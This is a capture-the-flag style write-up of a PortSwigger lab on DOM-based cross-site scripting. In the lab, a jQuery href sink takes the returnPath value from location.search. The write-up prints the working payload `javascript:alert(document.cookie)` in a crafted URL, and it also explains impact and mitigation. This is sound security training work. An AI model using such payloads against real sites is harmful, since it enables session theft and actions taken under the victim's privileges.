# DOM XSS in jQuery anchor href attribute sink using location.search source

**Source:** [PortSwigger](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-href-attribute-sink)  
**Category:** XSS  
**Difficulty:** APPRENTICE

## Objective
To solve this lab, make the "back" link alert `document.cookie`.

## Vulnerability
This lab contains a DOM-based cross-site scripting vulnerability in the submit feedback page. It uses the jQuery library's $ selector function to find an anchor element, and changes its href attribute using data from location.search.

## Exploitation

### Steps

1. Entering the laboratory and navigating to the `Submit feedback` tab. The URL then contains `/feedback?returnPath=/`.

2. Changing the URL to `/feedback?alert(document.cookie)`. Nothing happened.

3. Changing the URL to `/feedback?javascript:alert(document.cookie)`. Nothing happened.

4. Changing the URL to `/feedback?javascript:alert(document.cookie)=/`. Nothing happened.

5. Inspecting the page in DevTools. The following script can be found:

```html
<script>
$(function() {
    $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
});
</script>
```

6. Changing the URL to `/feedback?returnPath=javascript:alert(document.cookie)`. The lab was solved.

### Payload

```text
javascript:alert(document.cookie)
```

Full vulnerable parameter:

```text
?returnPath=javascript:alert(document.cookie)
```

### Shortcut

1. Navigate to the `Submit feedback` page and inspect the JavaScript responsible for the `Back` link:

```javascript
$('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
```

2. Notice that the value of the `returnPath` query parameter is taken directly from `location.search` and assigned to the `href` attribute of the `#backLink` element.

3. Set `returnPath` to a `javascript:` URL:

```text
/feedback?returnPath=javascript:alert(document.cookie)
```

## Impact

An attacker can construct a malicious URL containing JavaScript in the `returnPath` parameter. When a victim opens the URL and clicks the affected link, the JavaScript executes in the context of the vulnerable application's origin.

Depending on the application's security controls, this could allow an attacker to access information available to client-side JavaScript, perform actions with the victim's privileges, modify page content, or perform phishing attacks within the trusted application.

## Mitigation

Untrusted data obtained from URL parameters should not be assigned directly to security-sensitive DOM properties such as an anchor element's `href` attribute.

The application should validate the `returnPath` value and only permit expected destinations, such as relative paths belonging to the same application. Dangerous URL schemes such as `javascript:` should be explicitly rejected.

When dynamically modifying DOM elements, user-controlled values should be treated as data and validated according to the context of the destination sink.

A restrictive Content Security Policy (CSP) can provide additional defense in depth, but should not replace proper validation of user-controlled URLs.

## Tools

- Browser DevTools

## Notes

DOM-based XSS can occur entirely on the client side without the malicious value being inserted into the server-generated HTML response.

In this case, `location.search` acts as the source of attacker-controlled data:

```javascript
window.location.search
```

The jQuery `.attr()` operation that assigns this value to the `href` attribute acts as the sink:

```javascript
$('#backLink').attr("href", ...)
```

Because the application does not validate the URL scheme before assigning the value to `href`, a `javascript:` URL can be injected. The JavaScript executes when the victim clicks the resulting link.